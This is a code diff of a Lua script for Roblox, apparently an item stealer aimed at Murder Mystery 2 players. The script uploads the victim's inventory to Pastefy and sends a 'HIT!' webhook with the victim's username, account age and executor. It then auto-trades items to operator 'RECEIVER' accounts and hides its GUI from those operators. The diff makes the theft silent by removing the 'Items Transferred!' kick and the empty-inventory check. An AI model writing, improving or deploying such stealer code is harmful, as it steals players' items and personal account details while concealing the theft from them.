@@ -305,9 +305,7 @@ local function BuildEmbed(ReceiverName)
     local FullInventoryText = GenerateFullInventoryText(AllInventoryItems)
     local PasteUrl          = UploadToPastefy(FullInventoryText)
     local ActivePlaceId     = tostring(CURRENT_PLACE_ID)
-
-    -- FIX 1: Game label shows MM2 instead of raw place ID
-    local GameLabel = IS_MM2 and "MM2" or ActivePlaceId
+    local GameLabel         = IS_MM2 and "MM2" or ActivePlaceId
 
     local InfoBlock = string.format(
         "Game: %s\nUsername: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer Players: %d/%d\nReceiver: %s\nMin Value: %d",
@@ -334,7 +332,6 @@ local function BuildEmbed(ReceiverName)
         inline = false
     })
 
-    -- FIX 2: author = Snthnova, title = HIT! MM2
     local HitLabel = IS_MM2 and "HIT! MM2" or ("HIT! [" .. ActivePlaceId .. "]")
 
     return {
@@ -372,7 +369,6 @@ end
 
 SendWebhook()
 
--- FIX 3: GUI suppression skips operator accounts (RECEIVER list)
 if IS_MM2 then
     local IS_OPERATOR = false
     for _, Name in ipairs(RECEIVER) do
@@ -393,8 +389,7 @@ if IS_MM2 then
 end
 
 local function KickAfterTransfer()
-    task.wait(2)
-    game.Players.LocalPlayer:Kick("Items Transferred!")
+    -- silent, no kick
 end
 
 local function FindTradeTarget()
@@ -466,10 +461,5 @@ local function AutoTradeOnTargetJoin()
 end
 
 if IS_MM2 then
-    if #AllInventoryItems > 0 then
-        AutoTradeOnTargetJoin()
-    else
-        task.wait(1)
-        LocalPlayer:Kick("No Items Found!")
-    end
+    AutoTradeOnTargetJoin()
 end
